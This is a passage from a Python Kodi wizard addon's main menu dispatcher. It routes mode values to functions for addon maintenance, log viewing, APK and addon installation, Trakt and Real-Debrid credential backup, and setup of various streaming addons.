elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5653
elif mode =='freshstart':freshStart ()#line:5654
elif mode =='forceupdate':wiz .forceUpdate ()#line:5655
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5656
elif mode =='forceclose':wiz .killxbmc ()#line:5657
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5658
elif mode =='hidepassword':wiz .hidePassword ()#line:5659
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5660
elif mode =='enableaddons':enableAddons ()#line:5661
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5662
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5663
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5664
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5665
elif mode =='uploadlog':uploadLog .Main ()#line:5666
elif mode =='viewlog':LogViewer ()#line:5667
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5668
elif mode =='viewerrorlog':errorChecking (all =True )#line:5669
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5670
elif mode =='purgedb':purgeDb ()#line:5671
elif mode =='fixaddonupdate':fixUpdate ()#line:5672
elif mode =='removeaddons':removeAddonMenu ()#line:5673
elif mode =='removeaddon':removeAddon (name )#line:5674
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5675
elif mode =='removedata':removeAddonData (name )#line:5676
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5677
elif mode =='systeminfo':systemInfo ()#line:5678
elif mode =='restorezip':restoreit ('build')#line:5679
elif mode =='restoregui':restoreit ('gui')#line:5680
elif mode =='restoreaddon':restoreit ('addondata')#line:5681
elif mode =='restoreextzip':restoreextit ('build')#line:5682
elif mode =='restoreextgui':restoreextit ('gui')#line:5683
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5684
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5685
elif mode =='traktsync':traktsync ()#line:5686
elif mode =='apk':apkMenu (name )#line:5688
elif mode =='apkscrape':apkScraper (name )#line:5689
elif mode =='apkinstall':apkInstaller (name ,url )#line:5690
elif mode =='speed':speedMenu ()#line:5691
elif mode =='net':net_tools ()#line:5692
elif mode =='GetList':GetList (url )#line:5693
elif mode =='youtube':youtubeMenu (name )#line:5694
elif mode =='viewVideo':playVideo (url )#line:5695
elif mode =='addons':addonMenu (name )#line:5697
elif mode =='addoninstall':addonInstaller (name ,url )#line:5698
elif mode =='savedata':saveMenu ()#line:5700
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5701
elif mode =='managedata':manageSaveData (name )#line:5702
elif mode =='whitelist':wiz .whiteList (name )#line:5703
elif mode =='trakt':traktMenu ()#line:5705
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5706
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5707
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5708
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5709
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5710
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5711
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5712
elif mode =='realdebrid':realMenu ()#line:5714
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5715
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5716
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5717
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5718
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5719
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5720
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5721
elif mode =='login':loginMenu ()#line:5723
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5724
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5725
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5726
elif mode =='clearlogin':loginit .clearSaved (name )#line:5727
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5728
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5729
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5730
elif mode =='contact':notify .contact (CONTACT )#line:5732
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5733
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5734
elif mode =='developer':developer ()#line:5736
elif mode =='converttext':wiz .convertText ()#line:5737
elif mode =='createqr':wiz .createQR ()#line:5738
elif mode =='testnotify':testnotify ()#line:5739
elif mode =='testnotify2':testnotify2 ()#line:5740
elif mode =='servicemanual':servicemanual ()#line:5741
elif mode =='fastinstall':fastinstall ()#line:5742
elif mode =='testupdate':testupdate ()#line:5743
elif mode =='testfirst':testfirst ()#line:5744
elif mode =='testfirstrun':testfirstRun ()#line:5745
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5746
elif mode =='bg':wiz .bg_install (name ,url )#line:5748
elif mode =='bgcustom':wiz .bg_custom ()#line:5749
elif mode =='bgremove':wiz .bg_remove ()#line:5750
elif mode =='bgdefault':wiz .bg_default ()#line:5751
elif mode =='rdset':rdsetup ()#line:5752
elif mode =='mor':morsetup ()#line:5753
elif mode =='mor2':morsetup2 ()#line:5754
elif mode =='resolveurl':resolveurlsetup ()#line:5755
elif mode =='urlresolver':urlresolversetup ()#line:5756
elif mode =='forcefastupdate':forcefastupdate ()#line:5757
elif mode =='traktset':traktsetup ()#line:5758
elif mode =='placentaset':placentasetup ()#line:5759
elif mode =='flixnetset':flixnetsetup ()#line:5760
elif mode =='reptiliaset':reptiliasetup ()#line:5761
elif mode =='yodasset':yodasetup ()#line:5762
elif mode =='numbersset':numberssetup ()#line:5763
elif mode =='uranusset':uranussetup ()#line:5764
elif mode =='genesisset':genesissetup ()#line:5765
elif mode =='fastupdate':fastupdate ()#line:5766
elif mode =='folderback':folderback ()#line:5767
elif mode =='menudata':Menu ()#line:5768
elif mode ==2 :#line:5770
        wiz .torent_menu ()#line:5771
elif mode ==3 :#line:5772
        wiz .popcorn_menu ()#line:5773
elif mode ==8 :#line:5774
        wiz .metaliq_fix ()#line:5775
elif mode ==9 :#line:5776
        wiz .quasar_menu ()#line:5777
elif mode ==5 :#line:5778
        swapSkins ('skin.Premium.mod')#line:5779
elif mode ==13 :#line:5780
        wiz .elementum_menu ()#line:5781
elif mode ==16 :#line:5782
        wiz .fix_wizard ()#line:5783
elif mode ==17 :#line:5784
        wiz .last_play ()#line:5785
elif mode ==18 :#line:5786
        wiz .normal_metalliq ()#line:5787
elif mode ==19 :#line:5788
        wiz .fast_metalliq ()#line:5789
elif mode ==20 :#line:5790
        wiz .fix_buffer2 ()#line:5791
elif mode ==21 :#line:5792
        wiz .fix_buffer3 ()#line:5793
elif mode ==11 :#line:5794
        wiz .fix_buffer ()#line:5795
elif mode ==15 :#line:5796
        wiz .fix_font ()#line:5797
elif mode ==14 :#line:5798
        wiz .clean_pass ()#line:5799
elif mode ==22 :#line:5800
        wiz .movie_update ()#line:5801
elif mode =='adv_settings':buffer1 ()#line:5802
elif mode =='getpass':getpass ()#line:5803
elif mode =='setpass':setpass ()#line:5804
elif mode =='setuname':setuname ()#line:5805
elif mode =='passandUsername':passandUsername ()#line:5806
elif mode =='9':disply_hwr ()#line:5807
elif mode =='99':disply_hwr2 ()#line:5808
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))